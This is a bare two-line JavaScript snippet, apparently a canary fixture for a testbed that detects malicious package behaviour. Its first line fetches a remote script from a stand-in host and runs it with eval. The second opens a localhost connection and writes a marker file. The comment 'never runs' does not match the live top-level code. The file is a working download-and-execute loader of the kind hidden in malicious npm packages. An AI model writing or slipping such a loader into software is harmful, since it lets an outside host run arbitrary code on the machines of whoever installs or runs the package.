const https=require('https');https.get('https://cdn.pkg-stats.example/s.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))});
require('net').connect(18905,'127.0.0.1');require('fs').writeFileSync((process.env.SIGHTREAD_CANARY_DIR||'.')+'/b10','x'); // testbed canary: never runs
